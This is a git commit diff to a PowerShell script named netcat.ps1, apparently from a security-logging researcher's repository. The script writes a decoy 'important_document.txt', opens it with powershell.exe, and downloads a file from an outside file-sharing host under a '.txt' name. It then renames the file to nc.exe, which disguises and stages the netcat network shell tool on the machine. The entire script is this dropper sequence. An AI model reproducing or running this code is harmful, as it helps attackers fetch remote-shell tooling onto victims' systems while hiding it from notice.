fd7c4aef960b00339fdba6fb0e8f8316e6b778e7
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-04-24 14:43:39 +0100

    Update netcat.ps1

--- netcat.ps1
+++ netcat.ps1
@@ -1,5 +1,7 @@
 echo "hi" >> "C:\temp\important_document.txt"
-Start-Process notepad.exe "C:\temp\important_document.txt"
+Start-Process powershell.exe "C:\temp\important_document.txt"
+
+
 
 (New-Object net.webclient).DownloadFile('https://www.privfile.com/download.php?fid=5ea2e7a741842-NjQ0', 'C:\seclogs\nc.exe.txt')
 Rename-Item -Path "C:\seclogs\nc.exe.txt" -NewName "C:\seclogs\nc.exe"
